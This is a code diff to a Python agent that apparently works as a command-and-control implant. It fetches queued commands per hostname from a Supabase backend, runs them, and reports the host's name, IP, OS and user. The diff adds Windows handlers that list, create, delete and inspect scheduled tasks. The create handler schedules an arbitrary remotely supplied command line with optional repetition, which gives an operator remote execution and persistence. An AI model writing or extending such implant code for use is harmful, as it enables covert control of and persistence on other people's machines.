@@ -3,6 +3,7 @@
 import os
 import logging
 import time
+import shlex
 from supabase import create_client
 from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
@@ -41,6 +42,10 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.get_logged_on_users import get_logged_on_users
     from utils.winapi.get_drive_info import get_drive_info
     from utils.winapi.get_installed_programs import get_installed_programs
+    from utils.winapi.list_scheduled_tasks import list_scheduled_tasks
+    from utils.winapi.create_scheduled_task import create_scheduled_task
+    from utils.winapi.delete_scheduled_task import delete_scheduled_task
+    from utils.winapi.get_scheduled_task_info import get_scheduled_task_info
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -434,6 +439,64 @@ def execute_commands():
                     group_type, group_name = parts[1], parts[2]
                     logging.info(f"Parsed group_type: {group_type}, group_name: {group_name}")
                     result = list_users_in_group(group_type, group_name)
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower() == 'list_scheduled_tasks':
+                try:
+                    result = list_scheduled_tasks()
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('create_scheduled_task'):
+                try:
+                    parts = shlex.split(command_text, posix=False)
+                    if len(parts) < 4 or len(parts) > 6:
+                        raise ValueError("Invalid command format. Use 'create_scheduled_task <task_name> <command_line> <trigger_time> [repeat_interval] [repeat_duration]'")
+                    
+                    task_name = parts[1]
+                    command_line = parts[2].strip('"')
+                    trigger_time = parts[3]
+                    repeat_interval = parts[4] if len(parts) >= 5 else None
+                    repeat_duration = parts[5] if len(parts) == 6 else None
+                    
+                    result = create_scheduled_task(task_name, command_line, trigger_time, repeat_interval, repeat_duration)
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('delete_scheduled_task'):
+                try:
+                    parts = command_text.split(' ', 1)
+                    if len(parts) != 2:
+                        raise ValueError("Invalid command format. Use 'delete_scheduled_task <task_name>'")
+                    _, task_name = parts
+                    result = delete_scheduled_task(task_name)
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('get_scheduled_task_info'):
+                try:
+                    parts = command_text.split(' ', 1)
+                    if len(parts) != 2:
+                        raise ValueError("Invalid command format. Use 'get_scheduled_task_info <task_name>'")
+                    _, task_name = parts
+                    result = get_scheduled_task_info(task_name)
                     status = 'Completed'
                     output = "\n".join(result)
                 except Exception as e:
